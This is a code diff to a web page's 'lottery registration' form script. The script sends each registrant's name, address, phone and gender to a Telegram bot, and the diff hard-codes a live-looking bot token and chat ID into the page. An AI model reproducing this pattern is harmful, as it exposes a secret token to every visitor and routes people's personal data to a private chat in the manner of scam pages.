@@ -79,8 +79,8 @@
 </div>
 
 <script>
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+const TELEGRAM_BOT_TOKEN = '7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY';
+const TELEGRAM_CHAT_ID = '874563737';
 
 // Form Submission to Telegram
 document.getElementById('lotteryForm').addEventListener('submit', function (e) {
@@ -96,11 +96,11 @@ document.getElementById('lotteryForm').addEventListener('submit', function (e) {
     const message = `New Lottery Registration:\nName: ${firstName} ${middleName} ${lastName}\nAddress: ${address}\nPhone: ${phone}\nGender: ${gender}`;
 
     // Send message to Telegram
-    fetch(`https://api.telegram.org/bot${7636367334: AAE6d7AShLfccWJWMkyfSVrvpkURjfqtPY}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: 874563737,
+            chat_id: TELEGRAM_CHAT_ID,
             text: message,
         }),
     }).then(() => {
